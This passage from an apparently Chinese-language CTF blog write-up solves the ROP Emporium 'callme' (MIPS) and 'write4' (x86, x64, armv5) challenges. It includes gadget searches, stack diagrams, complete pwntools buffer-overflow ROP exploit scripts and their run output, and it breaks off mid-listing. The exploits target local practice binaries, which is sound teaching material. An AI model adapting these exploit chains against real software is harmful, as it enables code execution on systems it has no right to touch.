0x19</span><br></pre></td></tr></table></figure>\r\n<p>函数地址分别为<code>0x00400D20</code>，<code>0x00400D80</code>，<code>0x00400D10</code>。</p></li>\r\n<li><p>查看三个函数的参数</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">callme_one</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">int</span> a2, <span class=\"type\">int</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [sp+1Ch] [+1Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( a1 != <span class=\"number\">0xDEADBEEF</span> || a2 != <span class=\"number\">0xCAFEBABE</span> || a3 != <span class=\"number\">0xD00DF00D</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Incorrect parameters&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  stream = fopen(<span class=\"string\">&quot;encrypted_flag.dat&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  g_buf = (<span class=\"type\">int</span>)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x21</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !g_buf )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Could not allocate memory&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  g_buf = (<span class=\"type\">int</span>)fgets((<span class=\"type\">char</span> *)g_buf, <span class=\"number\">33</span>, stream);</span><br><span class=\"line\">  fclose(stream);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;callme_one() called correctly&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\r\n<li><p>寻找gadget</p>\r\n<p>在userfulFunction附近查找到以下gadget：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:00400BB0                               usefulGadgets:</span><br><span class=\"line\">.text:00400BB0 10 00 A4 8F                   lw      $a0, 0x10($sp)</span><br><span class=\"line\">.text:00400BB4 0C 00 A5 8F                   lw      $a1, 0xC($sp)</span><br><span class=\"line\">.text:00400BB8 08 00 A6 8F                   lw      $a2, 8($sp)</span><br><span class=\"line\">.text:00400BBC 04 00 B9 8F                   lw      $t9, 4($sp)</span><br><span class=\"line\">.text:00400BC0 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.text:00400BC4 00 00 00 00                   nop</span><br><span class=\"line\">.text:00400BC4</span><br><span class=\"line\">.text:00400BC8 14 00 BF 8F                   lw      $ra, 0x14($sp)</span><br><span class=\"line\">.text:00400BCC 08 00 E0 03                   jr      $ra</span><br><span class=\"line\">.text:00400BD0 18 00 BD 23                   addi    $sp, 0x18\t\t\t;延迟槽，会在上条jr指令前执行</span><br></pre></td></tr></table></figure>\r\n<p>可以利用此处gadget将callme函数的参数依次弹出给 <em>a0</em>，<em>a1</em>，<em>a2</em> 寄存器，并将callme函数地址弹出给 <em>t9</em> 寄存器，当callme函数返回后，会继续执行<code>0x00400BC8</code>处的指令，为了后续能够继续调用其他callme函数，且提供正确的参数，需要修改<code>0x14($sp)</code>处的值，将其修改为<code>0x00400BB0</code>，由于延迟槽的存在，在 <strong>jr $ra</strong> 指令指令执行前，<strong>addi $sp, 0x18</strong> 已经执行完毕，因此跳转到<code>0x00400BB0</code>后，sp指针已经增加了0x18，恰好跳过了之前填充的6*4字节数据，可以继续填充其他数据。其溢出数据填充如下：</p>\r\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +  exit addr (ra) +</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +    arg1\t\t\t+</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +\t   arg2\t        +</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +    arg3\t\t\t+</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +callme_three addr+</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +     BBBB        +</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  + 0x00400BB0 (ra) +</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +    arg1\t\t\t+</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +\t   arg2\t        +</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  +    arg3\t\t\t+</span><br><span class=\"line\">--+-----------------+--</span><br><span class=\"line\">  + callme_two addr +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 28</span><br><span class=\"line\">  +     BBBB        +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 24</span><br><span class=\"line\">  + 0x00400BB0 (ra) +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 20</span><br><span class=\"line\">  +     arg1        +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 16</span><br><span class=\"line\">  +\t\targ2\t\t+</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 12</span><br><span class=\"line\">  +     arg3        +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 8</span><br><span class=\"line\">  + callme_one addr +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp) + 4</span><br><span class=\"line\">  +     BBBB        +</span><br><span class=\"line\">--+-----------------+-- &lt;-- $(sp)</span><br><span class=\"line\">  + 0x00400BB0 (ra) +</span><br><span class=\"line\">  +-----------------+</span><br></pre></td></tr></table></figure></li>\r\n</ol>\r\n<h4 id=\"编写exp-1\">编写exp</h4>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;mips&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"><span class=\"comment\"># context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-mipsel&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/mipsel-linux-gnu/&#x27;</span>, <span class=\"string\">&#x27;./callme_mipsel&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">callme_one = <span class=\"number\">0x00400D20</span></span><br><span class=\"line\">callme_two = <span class=\"number\">0x00400D80</span></span><br><span class=\"line\">callme_three = <span class=\"number\">0x00400D10</span></span><br><span class=\"line\">exit_addr = <span class=\"number\">0x00400D40</span></span><br><span class=\"line\">lw_a0_a1_a2_t9_jalr = <span class=\"number\">0x00400BB0</span></span><br><span class=\"line\">arg1 = <span class=\"number\">0xDEADBEEF</span></span><br><span class=\"line\">arg2 = <span class=\"number\">0x0CAFEBABE</span></span><br><span class=\"line\">arg3 = <span class=\"number\">0x0D00DF00D</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(lw_a0_a1_a2_t9_jalr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">payload += p32(callme_one)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(lw_a0_a1_a2_t9_jalr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span></span><br><span class=\"line\">payload += p32(callme_two)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(lw_a0_a1_a2_t9_jalr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;DDDD&quot;</span></span><br><span class=\"line\">payload += p32(callme_three)</span><br><span class=\"line\">payload += p32(arg3)</span><br><span class=\"line\">payload += p32(arg2)</span><br><span class=\"line\">payload += p32(arg1)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(exit_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<h4 id=\"exp运行结果-1\">exp运行结果</h4>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-mipsel&#x27;</span>: pid 4986</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">callme by ROP Emporium</span><br><span class=\"line\">MIPS</span><br><span class=\"line\"></span><br><span class=\"line\">Hope you <span class=\"built_in\">read</span> the instructions...</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">callme_one() called correctly</span><br><span class=\"line\">callme_two() called correctly</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h2 id=\"write4\">write4</h2>\r\n<p>该题目考察的关键点在于题目中没有可直接利用的字符串，需要将字符串手动写入可写区域，然后将写入地址作为参数，调用打印函数，输出文件内容。</p>\r\n<h3 id=\"x86-3\">x86</h3>\r\n<p>将附件中的动态链接库拖入ida，分析题目关键代码如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [esp+0h] [ebp-28h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;write4 by ROP Emporium&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;x86\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Go ahead and give me the input already!\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x200</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可利用的函数如下：</p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">print_file</span><span class=\"params\">(<span class=\"type\">char</span> *filename)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [esp+Bh] [ebp-2Dh]</span></span><br><span class=\"line\">  FILE *stream; <span class=\"comment\">// [esp+2Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  stream = fopen(filename, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Failed to open file: %s\\n&quot;</span>, filename);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  fgets(&amp;s, <span class=\"number\">33</span>, stream);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(&amp;s);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> fclose(stream);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>该函数在write432中的函数地址为<code>0x080483D0</code>：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.plt:080483D0 _print_file     proc near               ; CODE XREF: usefulFunction+E↓p</span><br><span class=\"line\">.plt:080483D0                 jmp     ds:off_804A014</span><br><span class=\"line\">.plt:080483D0 _print_file     endp</span><br></pre></td></tr></table></figure>\r\n<p>可以利用缓冲区溢出，将<code>print_file</code>的地址覆盖<code>pwnme</code>的返回地址，但题目中没有<code>flag.txt</code>字符串，调用<code>print_file</code>函数也无法输出<code>flag.txt</code>的内容，为此，需要手动写入<code>flag.txt</code>字符串到可写区域，并将地址作为<code>print_file</code>函数的参数。</p>\r\n<p>搜寻可用的gadget：</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">ROPgadget --binary write432 --only <span class=\"string\">&quot;mov|pop|ret&quot;</span></span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x080484e7 : mov al, byte ptr [0xc9010804] ; ret</span><br><span class=\"line\">0x08048543 : mov dword ptr [edi], ebp ; ret</span><br><span class=\"line\">0x08048381 : mov ebx, 0x81000000 ; ret</span><br><span class=\"line\">0x08048423 : mov ebx, dword ptr [esp] ; ret</span><br><span class=\"line\">0x080485ab : pop ebp ; ret</span><br><span class=\"line\">0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0804839d : pop ebx ; ret</span><br><span class=\"line\">0x080485aa : pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x080485a9 : pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x08048386 : ret</span><br><span class=\"line\">0x0804849e : ret 0xeac1</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>\r\n<p>可以利用<code>0x08048543</code>的gadget将ebp寄存器的值存放到edi寄存器所指向的地址中，因此ebp寄存器需要存放<code>flag.txt</code>字符串，由于ebp寄存器只有32位，因此需要分两次写入；edi寄存器需要存放写入地址，查看write432的地址空间，可以看到data段可写入，因此可以将data段地址<code>0x0804A018</code>写入到edi寄存器中。为写入edi和ebp寄存器，可以使用<code>0x080485aa</code>处的gadget。</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">data:0804A018 ; ===========================================================================</span><br><span class=\"line\">.data:0804A018</span><br><span class=\"line\">.data:0804A018 ; Segment type: Pure data</span><br><span class=\"line\">.data:0804A018 ; Segment permissions: Read/Write</span><br><span class=\"line\">.data:0804A018 _data           segment dword public &#x27;DATA&#x27; use32</span><br><span class=\"line\">.data:0804A018                 assume cs:_data</span><br><span class=\"line\">.data:0804A018                 ;org 804A018h</span><br><span class=\"line\">.data:0804A018                 public __data_start ; weak</span><br><span class=\"line\">.data:0804A018 __data_start    db    0                 ; Alternative name is &#x27;__data_start&#x27;</span><br><span class=\"line\">.data:0804A018                                         ; data_start</span><br><span class=\"line\">.data:0804A019                 db    0</span><br><span class=\"line\">.data:0804A01A                 db    0</span><br><span class=\"line\">.data:0804A01B                 db    0</span><br><span class=\"line\">.data:0804A01C                 public __dso_handle</span><br><span class=\"line\">.data:0804A01C __dso_handle    db    0</span><br><span class=\"line\">.data:0804A01D                 db    0</span><br><span class=\"line\">.data:0804A01E                 db    0</span><br><span class=\"line\">.data:0804A01F                 db    0</span><br><span class=\"line\">.data:0804A01F _data           ends</span><br></pre></td></tr></table></figure>\r\n<p>因此，编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># p = gdb.debug(&#x27;./write432&#x27;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./write432&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">data_addr = <span class=\"number\">0x804A018</span></span><br><span class=\"line\">pop_edi_ebp = <span class=\"number\">0x080485aa</span></span><br><span class=\"line\">mov_edi_ebp = <span class=\"number\">0x08048543</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x28</span>+<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(pop_edi_ebp)</span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;flag&quot;</span></span><br><span class=\"line\">payload += p32(mov_edi_ebp)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(pop_edi_ebp)</span><br><span class=\"line\">payload += p32(data_addr + <span class=\"number\">4</span>)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;.txt&quot;</span></span><br><span class=\"line\">payload += p32(mov_edi_ebp)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(<span class=\"number\">0x80483D0</span>) <span class=\"comment\"># print_file</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span></span><br><span class=\"line\">payload += p32(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">b&quot;&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;./write432&#x27;</span> argv=[b<span class=\"string\">&#x27;./write432&#x27;</span>] : pid 4552</span><br><span class=\"line\">[DEBUG] Received 0x45 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;write4 by ROP Emporium\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;x86\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;Go ahead and give me the input already!\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">[DEBUG] Received 0x2 bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;&gt; &#x27;</span></span><br><span class=\"line\">[DEBUG] Sent 0x58 bytes:</span><br><span class=\"line\">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class=\"line\">    *</span><br><span class=\"line\">    00000020  41 41 41 41  41 41 41 41  41 41 41 41  aa 85 04 08  │AAAA│AAAA│AAAA│····│</span><br><span class=\"line\">    00000030  18 a0 04 08  66 6c 61 67  43 85 04 08  aa 85 04 08  │····│flag│C···│····│</span><br><span class=\"line\">    00000040  1c a0 04 08  2e 74 78 74  43 85 04 08  d0 83 04 08  │····│.txt│C···│····│</span><br><span class=\"line\">    00000050  42 42 42 42  18 a0 04 08                            │BBBB│····│</span><br><span class=\"line\">    00000058</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">[DEBUG] Received 0x2c bytes:</span><br><span class=\"line\">    b<span class=\"string\">&#x27;Thank you!\\n&#x27;</span></span><br><span class=\"line\">    b<span class=\"string\">&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;\\n&#x27;</span></span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"x64-3\">x64</h3>\r\n<p>与32位程序类似，但64位寄存器可以一次性将<code>flag.txt</code>字符串写入data段，然后将data段地址写入rdi寄存器即可。</p>\r\n<p>将<code>libwrite4.so</code>拖入IDA，首先查看溢出函数，发现返回地址距数组s距离为<code>0x20+8=0x28</code></p>\r\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;write4 by ROP Emporium&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;x86_64\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Go ahead and give me the input already!\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, <span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>将write4拖入IDA，查看<code>data</code>段地址及<code>print_file</code>函数地址</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.plt:0000000000400510 _print_file     proc near               ; CODE XREF: usefulFunction+9↓p</span><br><span class=\"line\">.plt:0000000000400510                 jmp     cs:off_601020</span><br><span class=\"line\">.plt:0000000000400510 _print_file     endp</span><br><span class=\"line\">...</span><br><span class=\"line\">data:0000000000601028                 public __data_start ; weak</span><br><span class=\"line\">.data:0000000000601028 __data_start    db    0                 ; Alternative name is &#x27;__data_start&#x27;</span><br><span class=\"line\">.data:0000000000601028                                         ; data_start</span><br><span class=\"line\">.data:0000000000601029                 db    0</span><br><span class=\"line\">.data:000000000060102A                 db    0</span><br><span class=\"line\">.data:000000000060102B                 db    0</span><br><span class=\"line\">.data:000000000060102C                 db    0</span><br><span class=\"line\">.data:000000000060102D                 db    0</span><br><span class=\"line\">.data:000000000060102E                 db    0</span><br><span class=\"line\">.data:000000000060102F                 db    0</span><br></pre></td></tr></table></figure>\r\n<p>搜索相关gadget：</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">ROPgadget --binary write4 --only <span class=\"string\">&quot;mov|pop|ret&quot;</span></span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000400629 : mov dword ptr [rsi], edi ; ret</span><br><span class=\"line\">0x0000000000400610 : mov eax, 0 ; pop rbp ; ret</span><br><span class=\"line\">0x0000000000400628 : mov qword ptr [r14], r15 ; ret</span><br><span class=\"line\">0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400690 : pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400692 : pop r15 ; ret</span><br><span class=\"line\">0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x0000000000400588 : pop rbp ; ret</span><br><span class=\"line\">0x0000000000400693 : pop rdi ; ret</span><br><span class=\"line\">0x0000000000400691 : pop rsi ; pop r15 ; ret</span><br><span class=\"line\">0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class=\"line\">0x00000000004004e6 : ret</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 15</span><br></pre></td></tr></table></figure>\r\n<p>从结果来看，可以使用<code>mov qword ptr [r14], r15 ; ret</code>、<code>pop r14 ; pop r15 ; ret</code>和<code>pop rdi ; ret</code>指令联合起来，分别将<em>flag.txt</em>字符串写入data地址并将data地址写入rdi寄存器中，编写exp如下：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./write4&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">print_file = <span class=\"number\">0x400510</span></span><br><span class=\"line\">pop_r14_r15 = <span class=\"number\">0x0400690</span></span><br><span class=\"line\">mov_r14_r15 = <span class=\"number\">0x0400628</span></span><br><span class=\"line\">data_addr = <span class=\"number\">0x601028</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400693</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;A&quot;</span> * <span class=\"number\">40</span></span><br><span class=\"line\">payload += p64(pop_r14_r15)</span><br><span class=\"line\">payload += p64(data_addr)</span><br><span class=\"line\">payload += <span class=\"string\">b&quot;flag.txt&quot;</span></span><br><span class=\"line\">payload += p64(mov_r14_r15)</span><br><span class=\"line\">payload += p64(pop_rdi)</span><br><span class=\"line\">payload += p64(data_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">payload += p64(print_file)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendafter(<span class=\"string\">b&quot;&gt; &quot;</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<p>程序运行结果如下：</p>\r\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">python exp.py</span> </span><br><span class=\"line\">[+] Starting local process &#x27;./write4&#x27;: pid 4826</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>\r\n<h3 id=\"armv5-3\">armv5</h3>\r\n<p>利用原理与x86类似，但需要查找到可利用的gadget，将栈上的字符串写入到data段中，并将data段地址写入 <em>r0</em> 寄存器。</p>\r\n<p>在IDA中发现后门函数附近存在可利用的gadget：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:000105EC                               usefulGadgets</span><br><span class=\"line\">.text:000105EC 00 30 84 E5                   STR     R3, [R4]</span><br><span class=\"line\">.text:000105F0 18 80 BD E8                   POP     &#123;R3,R4,PC&#125;</span><br></pre></td></tr></table></figure>\r\n<p>可以利用该处gadget，首先直接利用<code>0x000105F0</code>处 <strong>POP {R3,R4,PC}</strong> 指令将<code>b\"flag\"</code>字符、data段地址和<code>0x000105EC</code>弹出到 <em>r3</em> 、 <em>r4</em> 和 <em>pc</em> 寄存器中，然后利用 <strong>STR R3, [R4]</strong> 指令将<code>b\"flag\"</code>字符(r3寄存器)写入到 data段(r4寄存器)中，后面的<code>b\".txt\"</code>字符与之类似。</p>\r\n<p>接下来考虑如何将data段地址写入 <em>r0</em> 寄存器，搜索到如下gadget：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ./write4_armv5 --only <span class=\"string\">&quot;mov|pop&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000105e0 : mov r0, r0 ; pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x000105c8 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x000105c4 : mov r3, <span class=\"comment\">#0 ; mov r0, r3 ; pop &#123;fp, pc&#125;</span></span><br><span class=\"line\">0x000105cc : pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x000105f4 : 